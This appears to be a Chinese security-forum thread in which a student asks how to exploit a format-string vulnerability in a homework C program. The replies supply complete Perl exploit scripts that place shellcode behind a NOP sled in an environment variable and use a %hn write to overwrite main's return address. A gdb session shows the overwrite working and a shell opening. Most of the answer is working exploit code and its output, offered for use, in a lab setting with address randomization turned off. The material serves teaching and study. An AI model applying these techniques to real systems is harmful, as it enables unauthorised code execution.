
# 帮忙看看，这个格式化串漏洞怎么利用啊

> 原文：[`www.pediy.com/kssd/pediy11/121541.html`](https://www.pediy.com/kssd/pediy11/121541.html)

程序很简单，是一个作业题目。。~

```c
#include <stdio.h>

int main(int argc, char **argv) {
      if (argc == 2)
           printf(argv[1]);
      return 0;
}
```

要求如下：

在 linux 环境下，编译上述程序，生成可执行文件 `p`，构造一个字符串`$s`，是的执行语句：`"./p $s"`后产生一个新的 `shell`。如果需要可以通过语句：`"# echo 0 > /proc/sys/kernel/randomize_va_space"`关闭 `stack randomization`。

通过上述程序，产生一个 `shell`。

求`$s`.

~~~~~~

做了一点儿尝试，让程序跳转到用户输入中。通过`%n`尝试着修改返回地址，总是提示段错误 `segmentation fault`，，，没辙儿了，后面想的再好，这里就难住了。。

诸位大牛，求助啊

用户的输入格式化字符串参数是存放栈上的。

linux 下有没有`jmp esp`通用地址?

具体利用方法见 `The.Shellcoders.Handbook.2nd.Edition` 中 `page 75~84.`。

讲的比较清楚

记得先 root 用户运行: `echo 0 > /proc/sys/kernel/randomize_va_space`

```
watercloud@ubuntu:~/Downloads$ gcc -v
Using built-in specs.
Target: i486-linux-gnu
……
Thread model: posix
gcc version 4.4.3 (Ubuntu 4.4.3-4ubuntu5)
watercloud@ubuntu:~/Downloads$ cat fmt-vul.c
#include <stdio.h>
int main(int argc, char **argv) {
      if (argc == 2)
           printf(argv[1]);
      return 0;
}
watercloud@ubuntu:~/Downloads$ gcc fmt-vul.c -o fmt-vul -z execstack  #注意新版 gcc 编译必须带-z execstack 强制堆栈可执行
fmt-vul.c: In function ‘main’:
fmt-vul.c:4: warning: format not a string literal and no format arguments
watercloud@ubuntu:~/Downloads$ readelf -e fmt-vul |grep -i stack
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4  #确认堆栈属性为 RWE
watercloud@ubuntu:~/Downloads$ cat ex2.pl  #看看我们的利用程序
#!/usr/bin/perl
# Demo for exploit bof of "./fmt-vul"
#fmt-vul.c like this:
#include <stdio.h>
#int main(int argc, char **argv) {
#  if (argc == 2) {
#  printf(argv[1]); return 0;
#}
#$ENV_LEN=`env |wc -c`
%ENV={}; #清空一切环境变量，一会儿只留我们的 KK 环境变量
$SHELL="1\\xc0PPP\[YZ4\\xd0\\xcd\\x80j\\x0bX\\x99Rhn/shh//biT\[RSTY\\xcd\\x80";
$ENV{KK}=  "\\x90"x 65535  .  $SHELL;
#在 KK 环境变量中 65535 个 nop，强制 0xbffX0000 开始都是 shellcode，好定位 shellcode，0xbffX 是我们程序的堆栈高地址，用 gdb 获得具体值
system "gdb","--args","./fmt-vul","AAAA"."\\xce\\xfb\\xfe\\xbf"  .  "DDDDCCCCCCCCCCCCCCCCCC"  .  "%.8x" x 114  .  "%.48209x"  .  "%hn";   #注意%hn，不是用%n，%hn 将会把 print 的字符书目作为 short 类型写入指定地址，也就是只写 2 字节，输出字符串少多了，执行速度快
#ADDR:shell: 0xbfff0000 - 0xbfffff00
#ADDR：ret eip addr for me : 0xbfffefbce  #you should use gdb to get it 注意这个地址，gdb 中我们会讲到他，很重要
#EOF
watercloud@ubuntu:~/Downloads$ perl ex2.pl
GNU gdb (GDB) 7.1-ubuntu
Copyright (C) 2010 Free Software Foundation, Inc.
Reading symbols from /home/watercloud/Downloads/fmt-vul...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x80483e7
(gdb) x/20i main
   0x80483e4 <main>:  push   %ebp
   0x80483e5 <main+1>:  mov    %esp,%ebp
   0x80483e7 <main+3>:  and    $0xfffffff0,%esp
   0x80483ea <main+6>:  sub    $0x10,%esp
   0x80483ed <main+9>:  cmpl   $0x2,0x8(%ebp)
   0x80483f1 <main+13>:  jne    0x8048403 <main+31>
   0x80483f3 <main+15>:  mov    0xc(%ebp),%eax
   0x80483f6 <main+18>:  add    $0x4,%eax
   0x80483f9 <main+21>:  mov    (%eax),%eax
   0x80483fb <main+23>:  mov    %eax,(%esp)
   0x80483fe <main+26>:  call   0x804831c <printf@plt>
   0x8048403 <main+31>:  mov    $0x0,%eax
   0x8048408 <main+36>:  leave
   0x8048409 <main+37>:  ret
   0x804840a:  nop
   0x804840b:  nop
   0x804840c:  nop
   0x804840d:  nop
   0x804840e:  nop
   0x804840f:  nop
(gdb) break * 0x8048409  #再 ret 处也设置一个
Breakpoint 2 at 0x8048409
(gdb) r
Starting program: /home/watercloud/Downloads/fmt-vul AAAADDDDCCCCCCCCCCCCCCCCCC%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.48209x%hn
Breakpoint 1, 0x080483e7 in main ()
(gdb) x/4x $ebp
0xbffefbc8:  0xbffefc48  0x00161bd6  0x00000002  0xbffefc74 #对应为上级 ebp  返回值 eip 我们最有兴趣的  argc argv 地址
#记录 0xbffefbc8，我们一会儿还要看看，我们的目的是将 0x00161bd6 的高位修改为 0xbfff，这样返回值就变成了 0xbfff1bd6 了，就落到了我们的 shellcode
#我们所以需要用%hn 将值输入到 0xbffefbce ！
(gdb) x/2x 0xbffefc74 #看看 argv
0xbffefc74:  0xbffefd59  0xbffefd7c #对应 &argv[0] 和 &argv[1]
(gdb) x/s 0xbffefd59  #看看 argv[0]
0xbffefd59:  "/home/watercloud/Downloads/fmt-vul"
(gdb) x/s 0xbffefd7c  #看看 argv[1]
0xbffefd7c:  "AAAA\316\373\376\277DDDD", 'C' <repeats 18 times>, "%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%."...
(gdb) c
AAAADDDDCCCCCCCCCCCCCCCCCC0011e0c008……省略
Breakpoint 2, 0x08048409 in main ()  #到了第二个断点
(gdb) x/4x 0xbffefbc8  #来看看 main 函数的栈顶，我们希望修改的值是否修改好了？
0xbffefbc8:  0xbffefc48  0xbfff1bd6  0x00000002  0xbffefc74  #看到 0xbfff1bd6 了吧，修改成功！
#如果没有修改成功咋办？ 调整利用程序 ex2.pl 中的 "%.48209x" 值，比如，如果发现高位是 0xbffc，那么是少了 2，将把值改为%.48211x 就行了
(gdb) c
Continuing.
Continuing.
process 18015 is executing new program: /bin/dash
Error in re-setting breakpoint 1: Function "main" not defined.
$    #得到 shell 了
$ id
uid=1000(watercloud) gid=1000(watercloud) groups=4(adm),20(dialout),24(cdrom),46(plugdev),104(lpadmin),115(admin),120(sambashare),1000(watercloud)
$ exit
Program exited normally.
(gdb) q
watercloud@ubuntu:~/Downloads$
```

不用 gdb 调试的版本：

```
watercloud@ubuntu:~/Downloads$ cat ex.pl
#!/usr/bin/perl
%ENV={};
$SHELL="1\\xc0PPP\[YZ4\\xd0\\xcd\\x80j\\x0bX\\x99Rhn/shh//biT\[RSTY\\xcd\\x80";
$ENV{KK}=  "\\x90"x 65535  .  $SHELL;
exec ".//////////////////////////fmt-vul","AAAA"."\\xfe\\xfb\\xfe\\xbf"  .  "DDDDCCCCCCCCCCCCCCCCCCCCCC"  .  "%.8x" x 114  .  "%.48205x"  .  "%hn";
#ADDR:shell: 0xbffff300
#ret eip addr for me : 0xbfffefbce  #you should use gdb to get it
#EOF
#use : perl ex.pl
```
